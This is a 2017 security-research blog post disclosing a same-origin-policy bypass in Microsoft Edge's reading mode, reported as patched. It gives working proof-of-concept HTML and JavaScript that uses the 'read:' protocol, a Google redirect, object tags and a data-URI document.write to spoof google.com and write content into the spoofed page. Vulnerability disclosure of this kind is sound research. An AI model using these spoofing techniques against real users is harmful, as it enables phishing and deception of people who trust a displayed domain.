<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="alternate icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Astro v5.16.6"><title>SOP bypass courtesy of the reading mode (Edge)</title><meta name="description" content><link rel="canonical" href="https://www.brokenbrowser.com/blog/sop-bypass-abusing-read-protocol/"><meta property="og:title" content="SOP bypass courtesy of the reading mode (Edge)"><meta property="og:description" content><meta property="og:type" content="website"><meta property="og:url" content="https://www.brokenbrowser.com/blog/sop-bypass-abusing-read-protocol/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="SOP bypass courtesy of the reading mode (Edge)"><meta name="twitter:description" content><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.xml"><link rel="stylesheet" href="/_astro/_slug_.D8CnJWvD.css"></head> <body> <div class="container center"> <header class="header"> <div class="header__inner"> <div class="header__logo"> <a href="/"> <div class="logo">
MagicMac Labs
</div> </a> </div> <ul class="menu menu--mobile"> <li class="menu__trigger">Menu ▾</li> <li> <ul class="menu__dropdown"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </li> </ul> </div> <nav class="navigation-menu"> <ul class="navigation-menu__inner menu--desktop"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </nav> </header> <main class="content">  <article> <h1 class="post-title">SOP bypass courtesy of the reading mode (Edge)</h1> <div class="post-meta"> <time> <time datetime="2017-04-17T00:00:00.000Z"> 2017-04-17 </time> </time> <span class="post-category"> :: browser-workshop</span>  </div>  <div class="post-content">  <p>The Microsoft Edge team recently <a href="https://twitter.com/MicrosoftEdge/status/852929511259856898">tweeted about the reading mode</a>, a feature that removes the clutter from webpages to read without distractions. It was not new to me, I learned about it when I was trying to understand <a href="../abusing-of-protocols/">how pseudo-protocols worked on Edge</a> but I never played with it before, until that tweet reminded me its existence. If you are in a hurry watch the <a href="https://youtu.be/b0Ci2f7Mt8c">video PoC</a>, otherwise, read below.</p>
<h3 id="-update-this-bug-was-patched-on2017-06-13"><strong>[ Update: this bug was patched on 2017-06-13 ]</strong></h3>
<p>To see the reading mode in action, load a website and click on the reading view button (the book icon).</p>
<p><img src="/images/2017/04/01-normal-view.png" alt="Normal View"></p>
<p>Which makes the webpage easier on our eyes.</p>
<p><img src="/images/2017/04/02-reading-view.png" alt="Reading Mode"></p>
<p>But what’s the real location of this decaf version of the webpage? Open developer tools (F12) and type <strong>location.href</strong> in the console. It becomes clear that Edge is adding the **read: **pseudo-protocol in front of the URL.</p>
<p><img src="/images/2017/04/03-reading-view-protocol.png" alt="READ:: Protocol"></p>
<h2 id=""></h2>
<blockquote>
<p>The following vulnerabilities work in all Edge versions, but the PoC itself was built for Edge 15 (after Creators Update). To execute it on older ones it must be changed making sure that the reading-mode is capable to render it.</p>
</blockquote>
<h2 id="reading-mode-is-an-internal-resource">Reading-Mode is an internal resource</h2>
<p>The reading-mode webpage has nothing to do with the one from the real website. If we take a look at the source (press CTRL U) we will see that there’s no trace of the original page, in reality, this is an internal resource hosted in the file-system:</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">C</span><span style="color:var(--astro-code-token-punctuation)">:</span><span style="color:var(--astro-code-foreground)">\Windows\SystemApps\</span><span style="color:var(--astro-code-token-constant)">Microsoft</span><span style="color:var(--astro-code-foreground)">.MicrosoftEdge_8wekyb3d8bbwe\Assets\ReadingView</span></span></code></pre>
<p>Edge parses the content of the original webpage, removes iframes/scripts and other html tags, and finally renders it inside an iframe hosted in the internal reading view html. But all these tricks happen behind the scenes and the user ends up with the illusion of being in the original website because the address bar does not change, at all.</p>
<p>But, if Edge renders a webpage in reading mode by setting a “read:” protocol before the real URL, can we do that from a script? Can we load any URL in reading mode automatically?</p>
<h2 id="forcing-any-website-into-reading-mode">Forcing any website into reading mode</h2>
<p>Let’s see if we can force an arbitrary URL to render in reading-mode by prepending the **read: **protocol.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-constant)">location</span><span style="color:var(--astro-code-foreground)">.href </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)"> "read:http://www.cracking.com.ar"</span><span style="color:var(--astro-code-foreground)">; </span><span style="color:var(--astro-code-token-comment)">// prepending read: does the trick</span></span>
<span class="line"></span></code></pre>
<p>That worked perfectly well, but something called my attention: <strong>the URL in the address bar is cracking.com.ar but the rendered content comes from brokenbrowser.com</strong>. What? Well, if we go to cracking.com.ar we will see there’s a location.replace to brokenbrowser.com, but Edge did not update the address bar!</p>
<blockquote>
<p><strong>Vunerability #1</strong> - In reading mode, Edge does not update the address bar when a script/http redirection happens.</p>
</blockquote>
<p><img src="/images/2017/04/04-redirect-non-refresh.png" alt=""></p>
<h2 id="finding-an-interesting-redirect">Finding an interesting redirect</h2>
<p>This means that we can spoof any website with open redirects or even better, any website that is already redirecting to a website that we control. For example, if we can make google.com redirect to an evil page, then, the user will think the content is coming from google when in reality, it will be coming from evil.com.</p>
<p>By the way, it is not hard to spoof google considering that all its organic results are links that redirect to the target sites. For example, google has indexed a page “cracking-01.html” from cracking.com.ar, if we find the organic link that redirects to that page then we have the control. Makes sense? Let me open Chrome for a second and find a google redirect to cracking.com.ar. Remember: <strong>our goal is to find a google URL that redirects to a website that we control</strong>.</p>
<p><img src="/images/2017/04/05-google-redirect.png" alt=""></p>
<h2 id="redirecting-in-reading-mode">Redirecting in reading mode</h2>
<p>Now we have a google.com.ar URL that redirects to cracking.com.ar. The webpage in cracking.com.ar has a text saying “<em>Not really Google</em>” so we can easily identify where the content is really coming from. Below is the google redirect with the prepended read: protocol, opening that in Edge looks like this:</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">read</span><span style="color:var(--astro-code-token-punctuation)">:</span><span style="color:var(--astro-code-foreground)">https</span><span style="color:var(--astro-code-token-punctuation)">:</span><span style="color:var(--astro-code-token-comment)">//www.google.com.ar/url?sa=t&#x26;rct=j&#x26;q=&#x26;esrc=s&#x26;source=web&#x26;cd=1&#x26;cad=rja&#x26;uact=8&#x26;ved=0ahUKEwiRx_eksaTTAhURl5AKHcrxCuoQFgggMAA&#x26;url=http%3A%2F%2Fwww.cracking.com.ar%2Fcracking-01.html&#x26;usg=AFQjCNGa3PACMDlI6RdBOnoEfySVh1C2ZQ</span></span></code></pre>
<p><img src="/images/2017/04/06-google-redirects-to-cracking.png" alt=""></p>
<p>Wow! We have a nice spoof, but damn it, we are in reading mode! This means that we don’t have full control of the look of our page. Remember: Edge is stripping a lot of html content before rendering our tricky page. For example, iframes and scripts are removed and javascript links don’t work (thanks to a META CSP tag rendered before our content). How can we customize this page and get rid of that yellowish background? How can we run scripts here?</p>
<h2 id="running-scripts-in-reading-mode">Running scripts in reading mode</h2>
<p>When we are in reading mode Edge does its best to keep our content static, meaning that no scripts are allowed to run, iframes are discarded, etc. In other words, our content ends up looking more like a book than a webpage. But we will try to break the barriers of this static reading mode where everything looks frozen.</p>
<p>Let me save your time, bug hunter: I manually tested a few html tags like <strong>iframe/script/meta</strong> but they were correctly removed. Then, I tried with an **object/html **tag and to my surprise, it worked!. This was easier than expected, object/html tags mimic iframes almost to the letter: they are html containers capable of running scripts.</p>
<blockquote>
<p><strong>Vunerability #2</strong> - Microsoft Edge does not remove object tags when rendering in reading-mode.</p>
</blockquote>
<p>So, if we add an object tag to our tricky page in cracking.com.ar and fire a prompt, it will look pretty convincing.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-token-comment)">&#x3C;!-- prompt.html does a window.prompt with the hard coded "google.com needs..." message --></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">object</span><span style="color:var(--astro-code-token-function)"> data</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">"http://www.cracking.com.ar/prompt.html"</span><span style="color:var(--astro-code-foreground)">>&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">object</span><span style="color:var(--astro-code-foreground)">></span></span></code></pre>
<p><img src="/images/2017/04/07-svg-prompt.png" alt=""></p>
<p>Right now, Edge thinks that the top page origin is google.com.ar (not true, it is cracking.com.ar) and the object/html origin is cracking.com.ar (this is true). The problem, bug hunter, is that we are trapped in this little box where we can throw prompts/alerts but we can not access the top.</p>
<p>Let’s say we want to change the background-color of the top page to white, or write a something to make the attack more convincing, we will need to bypass the same origin policy or set the top URL without changing the address bar. Let’s try the former and bypass the SOP.</p>
<h2 id="thinking-outside-the-object-box">Thinking outside the <code>&#x3C;object></code> box</h2>
<p>How can we render a arbitrary html code on behalf of the top domain, so we can really access it? A <strong>data uri</strong> comes handy here. Instead of rendering content hosted in cracking.com.ar, we will render html from a data uri, just like this:</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-token-comment)">&#x3C;!-- object rendering a data uri --></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">object</span><span style="color:var(--astro-code-token-function)"> data</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">"data:,&#x3C;script>alert(top.location)&#x3C;/script>"</span><span style="color:var(--astro-code-foreground)">>&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">object</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">&#x3C;!-- ACCESS DENIED data uris have their own unique origin --></span></span></code></pre>
<p>Oppss! Not so fast. Edge does not allow us to access any other document from this data uri, and that’s correct! All browsers render data uris as unique origins <strong>different</strong> from their creators, but on Edge this restriction is easy to bypass: a self-document.write *after the page has been loaded *is enough to set our location matching our parent.</p>
<blockquote>
<p><strong>Vunerability #3</strong> - In data: uris, a self document.write sets the origin to the same as its parent/creator.</p>
</blockquote>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">object</span><span style="color:var(--astro-code-token-function)"> data</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">"data:,&#x3C;script></span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">window.onload = function()</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">{ // Executing a document.write in a data uri after the onload</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">  // changes the location of the object to its parent URL.</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">  document.write('&#x3C;script>alert(top.location.href)&#x3C;\/script>');</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">  document.close();</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">}</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">&#x3C;/script>"</span><span style="color:var(--astro-code-foreground)">>&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">object</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">&#x3C;!-- Now we have the same location as our top --></span></span></code></pre>
<p><img src="/images/2017/04/08-accessing-the-top.png" alt=""></p>
<p>Yes, bug hunter! We are <strong>really</strong> accessing google’s top domain now. At this point we have full access to the internal html code that renders the reading-mode magic, but instead of changing anything from it, let’s do a bold top.document.write and get rid of the yellowish background.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">object</span><span style="color:var(--astro-code-token-function)"> data</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">"data:,&#x3C;script></span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">window.onload = function()</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">{</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">  document.write(</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">    '&#x3C;script>'+</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">        'top.document.write(\'Trust me, we are on Google =)\');'+</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">        'top.document.close()'+</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">    '&#x3C;\/script>');</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">  document.close();</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">}</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">&#x3C;/script>"</span><span style="color:var(--astro-code-foreground)">>&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">object</span><span style="color:var(--astro-code-foreground)">></span></span></code></pre>
<p><img src="/images/2017/04/09-full-document-write.png" alt=""></p>
<p><a href="https://youtu.be/b0Ci2f7Mt8c">Video in YouTube</a>. If you want to have everything offline, grab the <a href="https://goo.gl/gQ8vAb">files from here</a>.</p>
<p>Bug hunter, in my opinion nothing beats persistence, but in this case it was a lucky strike thanks to the original <a href="https://twitter.com/MicrosoftEdge/status/852929511259856898">tweet</a> and the initial redirect. I’m completely sure that more things can be found so please keep researching! My friendly reader, most of the times I don’t go deeply on these bugs, so there should be enough room to expand on them. <strong>Make them yours</strong>! Experience -like Richard Feynman- <a href="https://www.amazon.com/Pleasure-Finding-Things-Out-Richard/dp/0465023959/">the pleasure of finding things out</a>. I am not a scientist but still, <a href="https://www.amazon.com/Pleasure-Finding-Things-Out-Richard/dp/0465023959/">this quote</a> deeply moves me:</p>
<blockquote>
<p>Why do we do science? Beyond altruistic and self-aggrandizing motivations, many of our best scientists work long hours seeking the electric thrill that comes only from learning something that nobody knew before.
That’s it. Nothing can make you feel the “electric thrill” except your curiosity and persistence. Explore, try, research, learn and even more important: have fun!</p>
</blockquote>
<p>Have a nice day! :)</p>
<p><a href="https://twitter.com/magicmac2000">Manuel</a>.</p> <div class="pagination"> <div class="pagination__title"> <span class="pagination__title-h">Read other posts</span> <hr> </div> <div class="pagination__buttons">  <a href="/blog/microsoft-edge-detecting-installed-extensions/" class="button inline prev">
&lt; [Detecting Installed Extensions (Edge)]
</a> <span>::</span> <a href="/blog/sop-bypass-uxss-tweeting-like-charles-darwin/" class="button inline next">
[SOP bypass / UXSS - Tweeting like Charles Darwin (Edge)] &gt;
</a> </div> </div>  </div> </article> <script type="module">document.addEventListener("DOMContentLoaded",()=>{document.querySelectorAll("pre.astro-code").forEach(t=>{const n=document.createElement("div");n.className="highlight",t.parentNode?.insertBefore(n,t),n.appendChild(t);const a=t.getAttribute("data-language")||"text",o=document.createElement("div");if(o.className="code-title",o.textContent=a,navigator.clipboard){const e=document.createElement("button");e.className="copy-button",e.textContent="Copy",e.addEventListener("click",async()=>{const c=t.textContent||"";try{await navigator.clipboard.writeText(c),e.textContent="Copied",setTimeout(()=>{e.textContent="Copy"},1e3)}catch(r){console.error("Failed to copy:",r)}}),o.appendChild(e)}n.insertBefore(o,t)})});</script>  <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>  </main> <footer class="footer"> <div class="footer__inner"> <div class="copyright"> <span>© 2026 MagicMac Labs</span> </div> </div> </footer> </div> <script type="module">(()=>{const s=document.querySelector(".container"),o=document.querySelectorAll(".menu");document.body.addEventListener("click",()=>{o.forEach(e=>{e.classList.contains("open")&&e.classList.remove("open")})}),window.addEventListener("resize",()=>{o.forEach(e=>{e.classList.remove("open")})}),o.forEach(e=>{const i=e.querySelector(".menu__trigger"),t=e.querySelector(".menu__dropdown");i&&t&&(i.addEventListener("click",n=>{n.stopPropagation(),e.classList.contains("open")?e.classList.remove("open"):(o.forEach(c=>c.classList.remove("open")),e.classList.add("open")),s&&t.getBoundingClientRect().right>s.getBoundingClientRect().right&&(t.style.left="auto",t.style.right="0")}),t.addEventListener("click",n=>n.stopPropagation()))})})();</script> </body> </html> 